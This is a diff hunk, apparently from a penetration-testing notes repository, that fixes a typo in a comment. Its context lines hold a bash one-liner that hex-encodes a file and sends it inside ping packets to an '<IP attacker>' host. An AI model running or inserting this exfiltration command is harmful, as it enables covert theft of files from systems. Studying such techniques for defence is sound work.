@@ -195,7 +195,7 @@ thanks to **@BinaryShadow\_**
 ```bash
 #In order to exfiltrate the content of a file via pings you can do:
 xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
-#This will 4bytes per ping packet (you could probablie increase this until 16)
+#This will 4bytes per ping packet (you could probably increase this until 16)
 ```
 
 ```python
